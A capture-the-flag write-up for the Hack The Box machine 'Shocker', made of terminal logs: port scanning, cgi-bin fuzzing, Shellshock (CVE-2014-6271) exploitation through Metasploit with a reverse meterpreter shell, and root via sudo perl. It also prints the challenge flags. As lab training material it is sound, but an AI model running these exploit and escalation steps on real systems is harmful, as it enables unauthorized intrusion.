# Shocker - HTB Easy

## Nmap

```
nmap -sC -sV -oA nmap 10.10.10.3  --stats-every=5s

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4f8ade8f80477decf150d630a187e49 (RSA)
|   256 228fb197bf0f1708fc7e2c8fe9773a48 (ECDSA)
|_  256 e6ac27a3b5a9f1123c34a55d5beb3de9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.86 seconds 
```

## Web Fuzzing&#x20;

### Small SecList (KO because / was missing to perform directory fuzzing)

```
ffuf -w /opt/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://10.10.10.56/FUZZ    

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.56/FUZZ
 :: Wordlist         : FUZZ: /opt/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

# directory-list-2.3-small.txt [Status: 200, Size: 137, Words: 9, Lines: 10, Duration: 193ms]
# Priority-ordered case-sensitive list, where entries were found [Status: 200, Size: 137, Words: 9, Lines: 10, Duration: 194ms]
#                       [Status: 200, Size: 137, Words: 9, Lines: 10, Duration: 194ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/ [Status: 200, Size: 137, Words: 9, Lines: 10, Duration: 194ms]
#                       [Status: 200, Size: 137, Words: 9, Lines: 10, Duration: 195ms]
#                       [Status: 200, Size: 137, Words: 9, Lines: 10, Duration: 195ms]
                        [Status: 200, Size: 137, Words: 9, Lines: 10, Duration: 210ms]
# on at least 3 different hosts [Status: 200, Size: 137, Words: 9, Lines: 10, Duration: 210ms]
#                       [Status: 200, Size: 137, Words: 9, Lines: 10, Duration: 210ms]
# Attribution-Share Alike 3.0 License. To view a copy of this [Status: 200, Size: 137, Words: 9, Lines: 10, Duration: 199ms]
# or send a letter to Creative Commons, 171 Second Street, [Status: 200, Size: 137, Words: 9, Lines: 10, Duration: 199ms]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 137, Words: 9, Lines: 10, Duration: 199ms]
# Copyright 2007 James Fisher [Status: 200, Size: 137, Words: 9, Lines: 10, Duration: 210ms]
# This work is licensed under the Creative Commons [Status: 200, Size: 137, Words: 9, Lines: 10, Duration: 199ms]
                        [Status: 200, Size: 137, Words: 9, Lines: 10, Duration: 20ms]
:: Progress: [87664/87664] :: Job [1/1] :: 1941 req/sec :: Duration: [0:00:49] :: Errors: 0 ::
```

### Small SecList (OK with / at the end

```
ffuf -w /opt/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://10.10.10.56/FUZZ/

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.56/FUZZ/
 :: Wordlist         : FUZZ: /opt/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

#                       [Status: 200, Size: 137, Words: 9, Lines: 10, Duration: 19ms]
#                       [Status: 200, Size: 137, Words: 9, Lines: 10, Duration: 19ms]
# on at least 3 different hosts [Status: 200, Size: 137, Words: 9, Lines: 10, Duration: 19ms]
#                       [Status: 200, Size: 137, Words: 9, Lines: 10, Duration: 19ms]
#                       [Status: 200, Size: 137, Words: 9, Lines: 10, Duration: 19ms]
# Attribution-Share Alike 3.0 License. To view a copy of this [Status: 200, Size: 137, Words: 9, Lines: 10, Duration: 33ms]
# or send a letter to Creative Commons, 171 Second Street, [Status: 200, Size: 137, Words: 9, Lines: 10, Duration: 36ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/ [Status: 200, Size: 137, Words: 9, Lines: 10, Duration: 36ms]
cgi-bin                 [Status: 403, Size: 294, Words: 22, Lines: 12, Duration: 36ms]
# Copyright 2007 James Fisher [Status: 200, Size: 137, Words: 9, Lines: 10, Duration: 36ms]
                        [Status: 200, Size: 137, Words: 9, Lines: 10, Duration: 22ms]
# Priority-ordered case-sensitive list, where entries were found [Status: 200, Size: 137, Words: 9, Lines: 10, Duration: 22ms]
# directory-list-2.3-small.txt [Status: 200, Size: 137, Words: 9, Lines: 10, Duration: 22ms]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 137, Words: 9, Lines: 10, Duration: 36ms]
# This work is licensed under the Creative Commons [Status: 200, Size: 137, Words: 9, Lines: 10, Duration: 36ms]
icons                   [Status: 403, Size: 292, Words: 22, Lines: 12, Duration: 20ms]
                        [Status: 200, Size: 137, Words: 9, Lines: 10, Duration: 111ms]
:: Progress: [87664/87664] :: Job [1/1] :: 2020 req/sec :: Duration: [0:00:50] :: Errors: 0 ::
```

### Cgi-bin scripts enumeration (OK user.sh)

```
ffuf -w /opt/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://10.10.10.56/cgi-bin/FUZZ.sh

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.56/cgi-bin/FUZZ.sh
 :: Wordlist         : FUZZ: /opt/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

# directory-list-2.3-small.txt [Status: 403, Size: 294, Words: 22, Lines: 12, Duration: 19ms]
# Suite 300, San Francisco, California, 94105, USA. [Status: 403, Size: 294, Words: 22, Lines: 12, Duration: 19ms]
# Copyright 2007 James Fisher [Status: 403, Size: 294, Words: 22, Lines: 12, Duration: 19ms]
# Priority-ordered case-sensitive list, where entries were found [Status: 403, Size: 294, Words: 22, Lines: 12, Duration: 19ms]
# Attribution-Share Alike 3.0 License. To view a copy of this [Status: 403, Size: 294, Words: 22, Lines: 12, Duration: 19ms]
#                       [Status: 403, Size: 294, Words: 22, Lines: 12, Duration: 19ms]
#                       [Status: 403, Size: 294, Words: 22, Lines: 12, Duration: 19ms]
# This work is licensed under the Creative Commons [Status: 403, Size: 294, Words: 22, Lines: 12, Duration: 19ms]
#                       [Status: 403, Size: 294, Words: 22, Lines: 12, Duration: 20ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/ [Status: 403, Size: 294, Words: 22, Lines: 12, Duration: 20ms]
# on at least 3 different hosts [Status: 403, Size: 294, Words: 22, Lines: 12, Duration: 20ms]
# or send a letter to Creative Commons, 171 Second Street, [Status: 403, Size: 294, Words: 22, Lines: 12, Duration: 27ms]
#                       [Status: 403, Size: 294, Words: 22, Lines: 12, Duration: 34ms]
user                    [Status: 200, Size: 125, Words: 20, Lines: 8, Duration: 26ms]
:: Progress: [87664/87664] :: Job [1/1] :: 2061 req/sec :: Duration: [0:00:50] :: Errors: 0 ::
```

#### user.sh content

```
cat /root/Downloads/user.sh                                
Content-Type: text/plain

Just an uptime test script

 10:46:28 up 1 day, 23:32,  0 users,  load average: 0.31, 0.14, 0.08
```

## CVE-2014-6271

### Enumeration (OK Vulnerable)

````
[Oct 05, 2024 - 17:00:24 (CEST)] exegol-htb_lame /workspace # nmap 10.10.10.56 -p 80 --script=http-shellshock --script-args uri=/cgi-bin/admin.cgi

Starting Nmap 7.93 ( https://nmap.org ) at 2024-10-05 17:00 CEST
Nmap scan report for 10.10.10.56
Host is up (0.13s latency).

PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.57 seconds
[Oct 05, 2024 - 17:00:35 (CEST)] exegol-htb_lame /workspace # nmap 10.10.10.56 -p 80 --script=http-shellshock --script-args uri=/cgi-bin/user.sh  

Starting Nmap 7.93 ( https://nmap.org ) at 2024-10-05 17:01 CEST
Nmap scan report for 10.10.10.56
Host is up (0.025s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-shellshock: 
|   VULNERABLE:
|   HTTP Shellshock vulnerability
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2014-6271
|       This web application might be affected by the vulnerability known
|       as Shellshock. It seems the server is executing commands injected
|       via malicious HTTP headers.
|             
|     Disclosure date: 2014-09-24
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
|       http://www.openwall.com/lists/oss-security/2014/09/24/10
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
|_      http://seclists.org/oss-sec/2014/q3/685

Nmap done: 1 IP address (1 host up) scanned in 0.34 seconds
```
````

### Exploitation (OK with metasploit)

````
```log
                                                                                                                                                                                                                                                                              
[Oct 05, 2024 - 16:57:22 (CEST)] exegol-htb_lame /workspace # msfconsole -q
msf6 > search shellshock

Matching Modules
================

   #   Name                                               Disclosure Date  Rank       Check  Description
   -   ----                                               ---------------  ----       -----  -----------
   0   exploit/linux/http/advantech_switch_bash_env_exec  2015-12-01       excellent  Yes    Advantech Switch Bash Environment Variable Code Injection (Shellshock)
   1   exploit/multi/http/apache_mod_cgi_bash_env_exec    2014-09-24       excellent  Yes    Apache mod_cgi Bash Environment Variable Code Injection (Shellshock)
   2   auxiliary/scanner/http/apache_mod_cgi_bash_env     2014-09-24       normal     Yes    Apache mod_cgi Bash Environment Variable Injection (Shellshock) Scanner
   3   exploit/multi/http/cups_bash_env_exec              2014-09-24       excellent  Yes    CUPS Filter Bash Environment Variable Code Injection (Shellshock)
   4   auxiliary/server/dhclient_bash_env                 2014-09-24       normal     No     DHCP Client Bash Environment Variable Code Injection (Shellshock)
   5   exploit/unix/dhcp/bash_environment                 2014-09-24       excellent  No     Dhclient Bash Environment Variable Injection (Shellshock)
   6   exploit/linux/http/ipfire_bashbug_exec             2014-09-29       excellent  Yes    IPFire Bash Environment Variable Injection (Shellshock)
   7   exploit/multi/misc/legend_bot_exec                 2015-04-27       excellent  Yes    Legend Perl IRC Bot Remote Code Execution
   8   exploit/osx/local/vmware_bash_function_root        2014-09-24       normal     Yes    OS X VMWare Fusion Privilege Escalation via Bash Environment Code Injection (Shellshock)
   9   exploit/multi/ftp/pureftpd_bash_env_exec           2014-09-24       excellent  Yes    Pure-FTPd External Authentication Bash Environment Variable Code Injection (Shellshock)
   10  exploit/unix/smtp/qmail_bash_env_exec              2014-09-24       normal     No     Qmail SMTP Bash Environment Variable Injection (Shellshock)
   11  exploit/multi/misc/xdh_x_exec                      2015-12-04       excellent  Yes    Xdh / LinuxNet Perlbot / fBot IRC Bot Remote Code Execution


Interact with a module by name or index. For example info 11, use 11 or use exploit/multi/misc/xdh_x_exec

msf6 > use 1
[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > show options

Module options (exploit/multi/http/apache_mod_cgi_bash_env_exec):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   CMD_MAX_LENGTH  2048             yes       CMD max line length
   CVE             CVE-2014-6271    yes       CVE to check/exploit (Accepted: CVE-2014-6271, CVE-2014-6278)
   HEADER          User-Agent       yes       HTTP header to use
   METHOD          GET              yes       HTTP method to use
   Proxies                          no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                           yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-
                                              metasploit.html
   RPATH           /bin             yes       Target PATH for binaries used by the CmdStager
   RPORT           80               yes       The target port (TCP)
   SSL             false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                          no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI                        yes       Path to CGI script
   TIMEOUT         5                yes       HTTP read response timeout (seconds)
   URIPATH                          no        The URI to use for this exploit (default is random)
   VHOST                            no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine
                                        or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  172.17.0.2       yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Linux x86



View the full module info with the info, or info -d command.

msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set RHOSTS 10.10.10.56
RHOSTS => 10.10.10.56
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set TARGETURI /cgi-bin/user.sh                                                
TARGETURI => /cgi-bin/user.sh
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set LHOST 10.10.16.2
LHOST => 10.10.16.2
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > run

[*] Started reverse TCP handler on 10.10.16.2:4444 
[*] Command Stager progress - 100.00% done (1092/1092 bytes)
[*] Sending stage (1017704 bytes) to 10.10.10.56
[*] Meterpreter session 1 opened (10.10.16.2:4444 -> 10.10.10.56:54000) at 2024-10-05 17:04:41 +0200

meterpreter > whoami
[-] Unknown command: whoami. Run the help command for more details.
meterpreter > shell
Process 13667 created.
Channel 1 created.
whoami
shelly
ls
user.sh
ls /home/
shelly
ls /home/shelly/
user.txt
cat /home/shelly/user.txt 
27e491a296db4e2eaa3e439b88a23aca
sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl

```
````

## Privesc (using perl setuid)

````
```log
meterpreter > shell
Process 13667 created.
Channel 1 created.
whoami
shelly
ls
user.sh
ls /home/
shelly
ls /home/shelly/
user.txt
cat /home/shelly/user.txt 
27e491a296db4e2eaa3e439b88a23aca
sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
ls -latr /usr/bin/perl
-rwxr-xr-x 2 root root 1907192 Mar 13  2016 /usr/bin/perl
sudo perl -e 'exec "/bin/sh";'

whoami
root
cat /root/root.txt       
46fec5091bad0aa3840f24f476a719fb
```
````















